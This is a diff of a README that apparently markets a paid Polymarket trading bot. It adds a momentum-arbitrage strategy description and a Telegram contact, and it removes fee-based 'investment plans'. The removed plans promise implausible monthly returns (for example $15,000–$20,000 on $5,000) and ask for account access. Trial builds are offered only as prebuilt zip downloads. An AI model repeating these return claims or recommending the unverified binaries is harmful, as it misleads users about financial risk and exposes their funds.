@@ -1,13 +1,114 @@
 # Polymarket Trading Bot — Automated Prediction Market Trading  
 
->Polymarket Trading Bot for automated prediction-market trading across Windows, macOS, and Linux. The project provides trial builds for testing the bot locally, while production plans include dedicated infrastructure, optimized trading parameters, strategy configuration, and technical support.
+> **Polymarket Trading Bot** for automated prediction-market trading across Windows, macOS, and Linux. The bot is designed around real-time market monitoring, **Momentum Spike Arbitrage**, probability estimation, and automated execution. Trial builds are available for local testing, while production plans include dedicated infrastructure, optimized trading parameters, strategy configuration, and technical support.
 
-Our plans are built around two core things:
+---
 
-* **Professional-grade infrastructure** - the server/VPS environment, deployment, monitoring, and resources required to run the bot reliably.
-* **Optimized trading parameters** - strategy parameters and configurations tuned according to the selected plan, trading capital, and risk profile.
+## ⚡ Core Strategy — Momentum Spike Arbitrage
 
-The main difference between the plans is the level of infrastructure, parameter optimization, automation, support, and strategy access included.
+The bot's core trading approach focuses on identifying short-term dislocations between **underlying crypto momentum** and **Polymarket contract pricing**.
+
+The strategy monitors the underlying market for sudden price and volume movements, estimates how those movements may affect the relevant prediction-market outcome, and compares the resulting probability estimate against the current Polymarket price.
+
+```text
+┌─────────────────────────┐
+│ Real-Time Crypto Feed   │
+│ BTC / ETH Price + Flow  │
+└────────────┬────────────┘
+             │
+             ▼
+┌─────────────────────────┐
+│ Detect Momentum Spike   │
+│ Price + Volume + Flow  │
+└────────────┬────────────┘
+             │
+             ▼
+┌─────────────────────────┐
+│ Estimate Future TWAP    │
+│ & Settlement Probability│
+└────────────┬────────────┘
+             │
+             ▼
+┌─────────────────────────┐
+│ Compare Fair Value      │
+│ vs Polymarket Price     │
+└────────────┬────────────┘
+             │
+             ▼
+      ┌───────────────┐
+      │ Positive EV?  │
+      └───────┬───────┘
+              │ YES
+              ▼
+┌─────────────────────────┐
+│ Execute + Manage Trade  │
+│ Slippage / Risk / Exit  │
+└─────────────────────────┘
+```
+
+### Example Signal
+
+```text
+BTC 3-second return       +0.28%
+Volume acceleration        4.1x
+Order-book imbalance       +0.72
+Polymarket UP               53¢
+Estimated fair value        59¢
+Potential probability gap    6¢
+```
+
+The bot does **not** simply trade because BTC moves.
+
+The objective is to identify situations where:
+
+```text
+Underlying momentum
+        +
+Confirmed market flow
+        +
+Estimated settlement probability
+        >
+Current Polymarket price
+```
+
+### TWAP-Aware Trading
+
+For crypto Up/Down markets using TWAP-based resolution, the strategy should account for the **expected path of the underlying price during the relevant resolution window**, rather than relying solely on the latest price tick.
+
+Conceptually:
+
+```text
+Momentum Spike
+      ↓
+Estimate Future Price Path
+      ↓
+Estimate TWAP
+      ↓
+Calculate Outcome Probability
+      ↓
+Compare With Market Price
+      ↓
+Trade Only When Edge Is Large Enough
+```
+
+This makes the strategy fundamentally different from a simple **"last-tick sniper."**
+
+### Risk Controls
+
+Production implementations should account for:
+
+* Maximum position size
+* Minimum expected edge
+* Maximum acceptable slippage
+* Stale market-data detection
+* Execution timeout
+* Remaining TWAP window
+* Maximum daily loss
+* Position limits
+* API/network failures
+* Emergency kill switch
+
+> **Momentum Spike Arbitrage is an execution and probability-based strategy, not a guaranteed-profit system.** Market repricing, latency, slippage, liquidity, and model error can eliminate the expected edge.
 
 ---
 ## 📥 Download Trial Version
@@ -20,241 +121,6 @@ Choose the build that matches your operating system:
 | **Windows x64** | [Download Windows Trial](https://github.com/user-attachments/files/31364691/Polymarket-Trading-Bot-windows-x64.zip) |
 | **macOS Intel x64** | [Download macOS Trial](https://github.com/nagi777x/Polymarket-Trading-Bot/blob/master/trial/Polymarket-Trading-Bot-macos-x64.zip) |
 | **Linux x64** | [Download Linux Trial](https://github.com/user-attachments/files/31364717/Polymarket-Trading-Bot-linux-x64.zip) |
-
----
-
-# 💰 Investment Plans
-
-## 🟢 Starter Plan
-
-**Best for beginners who want to test the system with a smaller setup.**
-
-### Client Responsibilities
-
-* Pay a **$1,500 USD one-time setup fee**
-* Pay the **$299 USD monthly fee**
-* Provide recommended trading capital of **$1,000**
-* Create and maintain their own Polymarket account
-* Fund the trading account with the required capital
-
-### What We Provide
-
-* Bot deployment on the required infrastructure
-* Infrastructure suitable for the Starter configuration
-* Optimized trading parameters for the Starter strategy
-* Initial configuration and setup
-* Basic technical support
-* System monitoring and technical maintenance
-
-### Payment
-
-**$1,500 USD setup fee + $299 USD monthly**
-
-### Target Performance
-
-**Up to $2,000-$2,500 per month**
-
-> Performance is not guaranteed. Actual results depend on market conditions, liquidity, execution, trading capital, and selected parameters.
-
----
-
-# 🔵 Growth Plan - ⭐ Most Popular
-
-**Best overall value for users who want more advanced strategy access and stronger infrastructure.**
-
-### Client Responsibilities
-
-* Pay a **$3,500 USD one-time setup fee**
-* Pay the **$499 USD monthly fee**
-* Provide recommended trading capital of **$1,500**
-* Create and maintain their own Polymarket account
-* Fund the trading account with the required capital
-
-### What We Provide
-
-* Bot deployment on higher-performance infrastructure
-* Infrastructure optimized for the Growth configuration
-* Advanced strategy access
-* Optimized trading parameters
-* Strategy configuration based on the selected trading capital
-* Ongoing parameter optimization
-* Priority technical support
-* System monitoring and technical maintenance
-
-### Payment
-
-**$3,500 USD setup fee + $499 USD monthly**
-
-### Target Performance
-
-**Up to $5,000-$6,500 per month**
-
-> Performance is not guaranteed. Actual results depend on market conditions, liquidity, execution, trading capital, and selected parameters.
-
----
-
-# 🟣 Professional Plan
-
-**For serious traders who want advanced automation, strategy optimization, and priority support.**
-
-### Client Responsibilities
-
-* Pay a **$7,500 USD one-time setup fee**
-* Pay the **$999 USD monthly fee**
-* Provide recommended trading capital of **$5,000**
-* Create and maintain their own Polymarket account
-* Fund the trading account with the required capital
-
-### What We Provide
-
-* High-performance bot infrastructure
-* Infrastructure configuration optimized for professional trading
-* Advanced automation
-* Advanced strategy configuration
-* Optimized trading parameters
-* Ongoing strategy and parameter optimization
-* Performance-focused configuration
-* Priority technical support
-* System monitoring and technical maintenance
-
-### Payment
-
-**$7,500 USD setup fee + $999 USD monthly**
-
-### Target Performance
-
-**Up to $15,000-$20,000 per month**
-
-> Performance is not guaranteed. Actual results depend on market conditions, liquidity, execution, trading capital, and selected parameters.
-
----
-
-# 🟠 Elite Plan
-
-**For high-capital users who want a customized setup and premium-level infrastructure.**
-
-### Client Responsibilities
-
-* Pay a **$10,000+ USD one-time setup fee**
-* Pay a **custom monthly fee**
-* Provide recommended trading capital of **$10,000+**
-* Create and maintain their own Polymarket account
-* Fund the trading account with the required capital
-
-### What We Provide
-
-* Premium infrastructure configuration
-* Advanced strategy configuration
-* Custom parameter optimization
-* Risk-management configuration
-* Infrastructure and bot configuration based on available trading capital
-* Ongoing strategy optimization
-* Premium technical support
-* Customized system monitoring and maintenance
-
-### Payment
-
-**$10,000+ USD setup fee + custom monthly fee**
-
-### Target Performance
-
-**Performance dependent**
-
-> There is no fixed profit target or guarantee under this plan. Results depend on market conditions, liquidity, execution, capital allocation, strategy configuration, and risk management.
-
----
-
-# 🤝 Performance Partnership Plan
-
-**My favorite option for users who have the capital but would rather avoid upfront and monthly fees.**
-
-This is a performance-based partnership instead of a traditional fixed-fee plan.
-
-### Client Responsibilities
-
-* **$0 upfront fee**
-* **$0 monthly fee**
-* Provide trading capital of **$7,500-$10,000**
-* Maintain the required trading capital
-* Create and maintain the required Polymarket account
-* Provide the necessary account access for the agreed setup
-
-### What We Provide
-
-* Bot deployment and configuration
-* Infrastructure required to operate the strategy
-* Infrastructure optimized for the agreed trading setup
-* Strategy configuration similar to the **Growth or Professional** level
-* Optimized trading parameters
-* Ongoing strategy and parameter optimization
-* System monitoring
-* Technical maintenance and support
-
-### Payment
-
-**$0 upfront + $0 monthly**
-
-Instead, the partnership operates on a **30%-40% share of net profits**.
-
-### Key Terms
-
-* Required trading capital: **$7,500-$10,000**
-* Profit share: **30%-40% of net profits**
-* Strategy level: **Similar to Growth or Professional**
-* No fixed profit guarantee
-* Performance-based payment
-
----
-
-# 📊 Pricing Overview
-
-| Plan                       | Best For                            | One-Time Fee | Monthly Fee | Recommended Capital |
-| -------------------------- | ----------------------------------- | -----------: | ----------: | ------------------: |
-| 🟢 Starter                 | Budget-conscious users / beginners  |   **$1,500** |    **$299** |         **$1,000+** |
-| 🔵 Growth ⭐                | Main target market                  |   **$3,500** |    **$499** |         **$1,500+** |
-| 🟣 Professional            | Serious / wealthy users             |   **$7,500** |    **$999** |         **$5,000+** |
-| 🟠 Elite                   | High-capital / high-net-worth users | **$10,000+** |  **Custom** |        **$25,000+** |
-| 🤝 Performance Partnership | Capital-rich, fee-sensitive users   |       **$0** |      **$0** |        **$10,000+** |
-
----
-
-# 🧠 What You're Actually Paying For
-
-The service fee is not simply for a copy of the bot.
-
-For every plan, the core value we provide is:
-
-### 1. Infrastructure
-
-We provide and configure the infrastructure required to run the bot effectively.
-
-Depending on the selected plan, this can include:
-
-* High-performance VPS/server infrastructure
-* Bot deployment and configuration
-* Network and execution environment optimization
-* Continuous system availability
-* Monitoring and maintenance
-* Infrastructure resources appropriate for the selected strategy
-
-### 2. Optimized Parameters
-
-The bot's performance depends heavily on its configuration and trading parameters.
-
-We provide:
-
-* Plan-specific trading parameters
-* Capital-appropriate configuration
-* Strategy optimization
-* Risk-management parameters
-* Execution configuration
-* Ongoing parameter adjustments where applicable
-
-**Higher-tier plans receive more advanced parameter configurations and optimization.**
-
-### 3. Technical Support
-
-Depending on the plan, support ranges from basic technical assistance to priority/premium support and ongoing strategy guidance.
 
 ---
 
@@ -480,6 +346,48 @@ bash start-Polymarket-Trading-Bot.sh
 
 ---
 
+# ⚡ Strategy Pipeline
+
+The trading engine can be viewed as five primary stages:
+
+```text
+1. MARKET DATA
+   ↓
+   BTC / ETH price, volume and order flow
+
+2. MOMENTUM DETECTION
+   ↓
+   Detect abnormal short-term movement
+
+3. PROBABILITY MODEL
+   ↓
+   Estimate future TWAP and outcome probability
+
+4. EDGE DETECTION
+   ↓
+   Compare model probability against Polymarket price
+
+5. EXECUTION
+   ↓
+   Enter, manage and exit while controlling risk
+```
+
+The important distinction is that **a momentum spike alone is not an entry signal**.
+
+The bot seeks a combination of:
+
+```text
+Momentum
++ Confirmation
++ Probability Edge
++ Sufficient Liquidity
++ Acceptable Execution Cost
+```
+
+before executing a trade.
+
+---
+
 # ⚠️ Trial vs. Production Setup
 
 The trial version is intended to let users verify that the bot runs correctly on their own environment.
@@ -556,19 +464,6 @@ The trial version runs with your own machine and your own settings, so its resul
 
 ---
 
-# 💳 Accepted Payment Methods
-
-**USDT / USDC**
-
-Supported networks:
-
-* ERC20
-* BEP20
-* TRON
-* Solana
-
----
-
 # 📌 Important Terms
 
 * Trading capital is separate from service/setup fees unless explicitly agreed otherwise.
@@ -583,10 +478,26 @@ Supported networks:
 
 ---
 
-# 🚀 Getting Started
+# 💬 Contact & Support
 
-If you want to test the software first, start with the appropriate **Windows, macOS Intel, or Linux x64 trial build**.
+Need help with setup, configuration, trial access, production deployment, or strategy-related questions?
 
-If you're looking for a production setup, choose the plan based on your trading capital and the level of infrastructure, optimized parameters, automation, and support you need.
+### Direct Support
 
-**The software is only one part of the system - infrastructure and parameter optimization are what make the production configurations different from the trial build.**
+**Telegram:** [@nagi_777x](https://t.me/nagi_777x)
+
+> For the fastest response, send a short message with your operating system, plan or build version, and a brief description of what you need help with.
+
+### What You Can Contact Me About
+
+* Bot installation and initial setup
+* Windows, macOS, and Linux deployment
+* `.env` configuration
+* Production infrastructure
+* Strategy configuration and optimization
+* Momentum Spike Arbitrage implementation
+* Performance and execution optimization
+* Paid plans and production deployments
+* Technical support and troubleshooting
+
+---
